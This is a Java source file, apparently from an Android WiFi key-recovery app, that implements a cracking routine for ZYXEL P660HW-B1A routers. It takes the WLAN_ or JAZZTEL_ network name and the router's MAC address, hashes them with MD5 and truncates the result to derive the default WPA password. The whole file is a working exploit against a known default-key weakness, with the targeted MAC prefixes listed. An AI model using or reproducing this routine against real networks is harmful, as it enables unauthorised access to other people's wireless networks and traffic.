package es.pulimento.wifi.core.algorithms;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;

/**
 * Zyxel algorithm.
 * This exploits a vulnerability in ZYXEL P660HW-B1A router.
 * Supported MAC addresses:
 * 00:1F:A4:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
 * F4:3E:61:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
 */
public class ZyxelAlgorithm extends CrackAlgorithm {

	/**
	 * {@inheritDoc}
	 */
	public ZyxelAlgorithm(String essid, String bssid) {
		super(essid, bssid);
	}

	@Override
	protected void setPatterns() {

		// ESSID: WLAN_XXXX / JAZZTEL_XXXX
		// BSSID: 00:1F:A4:XX:XX:XX
		addPattern("(?:WLAN|JAZZTEL)_([0-9a-fA-F]{4})", "(00:1F:A4:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX / JAZZTEL_XXXX
		// BSSID: F4:3E:61:XX:XX:XX
		addPattern("(?:WLAN|JAZZTEL)_([0-9a-fA-F]{4})", "(F4:3E:61:[0-9A-Fa-f:]{8})");

		// Added all macs untill version 3 which will be focused on this.
		addPattern("(?:WLAN|JAZZTEL)_([0-9a-fA-F]{4})", "(98:F5:37:[0-9A-Fa-f:]{8})");
		addPattern("(?:WLAN|JAZZTEL)_([0-9a-fA-F]{4})", "(40:4A:03:[0-9A-Fa-f:]{8})");
	}

	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		essid_data = essid_data.toUpperCase();
		bssid_data = bssid_data.replace(":", "").toUpperCase();
   		return MD5Hash(bssid_data.substring(0,8).toLowerCase()+essid_data.substring(essid_data.length()-4, essid_data.length()).toLowerCase()).toLowerCase();	
	}

	private static String MD5Hash(String input) {
		try {
			String hashtext = (new BigInteger(1, MessageDigest.getInstance("MD5").digest(input.getBytes()))).toString(16);
			while (hashtext.length() < 20)
				hashtext = "0" + hashtext;
			return hashtext.substring(0, 20);
		} catch (NoSuchAlgorithmException e) {
			throw new RuntimeException(e);
		}
	}

	public static boolean supportsEncryption(WirelessEncryption mCapabilities) {
		return mCapabilities.equals(WirelessEncryption.WPA);
	}
}
